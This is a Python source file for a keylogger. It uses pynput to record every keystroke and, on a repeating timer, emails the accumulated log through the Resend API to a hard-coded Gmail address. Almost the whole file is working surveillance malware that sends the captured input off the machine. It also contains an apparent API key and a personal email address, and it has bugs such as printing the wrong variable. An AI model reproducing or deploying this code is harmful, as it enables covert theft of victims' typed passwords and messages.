#!/usr/bin/env python3

from pynput import keyboard
import threading
import os
import resend

log = ""


class Keylogger:
    def __init__(self, time_interval):
        print("Constructor Working...")
        self.log = ""
        self.interval = time_interval
        # self.email = email

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            # log = log + " " + str(key.char)
            current_Key = str(key.char)
            print(log)
        except AttributeError:
            if str(key) == "Key.space":
                current_Key = " "
            elif str(key) == "Key.esc":
                return False
            elif str(key) == "Key.backspace":
                current_Key = "space "
            else:
                current_Key = " " + str(key) + " "

        self.append_to_log(current_Key)

    def report(self):
        print(self.log)
        self.email(self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()


    def email(self, message):
        resend.api_key = os.environ["re_fzjDNHxM_KB6PXpmZXwD1i3jN1NFqg8gB"]

        params = {
            "from": "<log@resend.dev>",
            "to": ["tboymaroga7@gmail.com"],
            "subject": "Kelogger",
            "html": f"<strong>{message}</strong>",
        }

        email = resend.Emails.send(params)
        print(email)


    def start(self):
        keyboard_listener = keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
